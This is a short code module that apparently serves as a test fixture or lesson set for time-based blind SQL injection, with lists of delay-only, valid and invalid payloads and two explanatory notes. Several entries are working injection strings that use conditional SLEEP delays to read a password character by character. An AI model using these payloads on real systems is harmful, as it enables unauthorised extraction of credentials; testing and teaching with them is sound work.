export const timeBasedBlindSqliPayloads = {
    delayOnly: [
        "guest' OR SLEEP(5)--",
        "guest' OR pg_sleep(5)--",
    ],

    valid: [
        "guest' AND IF(SUBSTRING(password,1,1)='s',SLEEP(5),0)--",
        "guest' AND CASE WHEN SUBSTRING(password,1,1)='s' THEN SLEEP(5) ELSE 0 END--",
    ],

    invalid: [
        "guest-session",
        "guest' AND IF(SUBSTRING(password,1,1)='x',SLEEP(5),0)--",
    ],

    notes: [
        "Time-based blind SQLi relies on response delay rather than visible data.",
        "An unconditional delay proves execution, but a conditional delay proves data extraction.",
    ],
};